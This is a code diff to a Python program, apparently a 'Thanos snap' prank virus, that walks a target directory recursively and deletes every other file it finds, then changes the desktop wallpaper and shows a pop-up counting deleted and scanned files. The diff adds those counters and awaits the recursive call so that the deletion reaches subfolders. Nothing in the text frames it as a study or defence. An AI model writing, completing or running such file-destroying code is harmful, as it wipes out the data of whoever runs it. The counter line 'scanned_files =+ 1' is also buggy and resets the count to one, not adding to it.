@@ -13,7 +13,10 @@ bg = [
     "wallpaper3.jpg"
 ]
 
-def popUp():
+scanned_files = 0
+deleted_files = 0
+
+def popUp(deleted_files, scanned_files):
     root = tk.Tk()
     root.configure(background="black")
 
@@ -30,7 +33,7 @@ def popUp():
 
     font = ("Ani", 20, "bold")
 
-    label = tk.Label(root, text='1       5', bg='black', fg='white', font= font)
+    label = tk.Label(root, text='%d       %d' % (deleted_files, scanned_files), bg='black', fg='white', font= font)
     label.place(relx=0.5, rely=0.5, anchor="center")
 
     #label.pack()
@@ -44,21 +47,28 @@ def bgSound():
 
 
 async def thanos(dossier):
-    for nom_fichier in os.scandir(dossier):
+    
+    global deleted_files
+    global scanned_files
+
+    for i, nom_fichier in enumerate(os.scandir(dossier)):
         if nom_fichier.name != 'virus':
             if nom_fichier.is_dir():
-                thanos(nom_fichier.path)
+                await thanos(nom_fichier.path)
             else:
-                delete = 0
-                try:
-                    if delete == 0:
-                        os.chmod(nom_fichier.path, 0o644)
-                        os.remove(nom_fichier.path)
-                        print('delete ' + nom_fichier.path)
-                    else:
-                        print('keep')
-                except:
-                    print('Mixmax')
+                if i % 2 == 0:
+                    delete = 0
+                    try:
+                        if delete == 0:
+                            os.chmod(nom_fichier.path, 0o644)
+                            os.remove(nom_fichier.path)
+                            deleted_files += 1
+                            print('delete ' + nom_fichier.path)
+                        else:
+                            print('keep')
+                    except:
+                        print('Mixmax')
+                scanned_files =+ 1
 
 
 async def main():
@@ -70,7 +80,7 @@ async def main():
     await asyncio.sleep(5)
     await task
     wallpaper(2)
-    popUp()
+    popUp(deleted_files, scanned_files)
 
 asyncio.run(main())
 
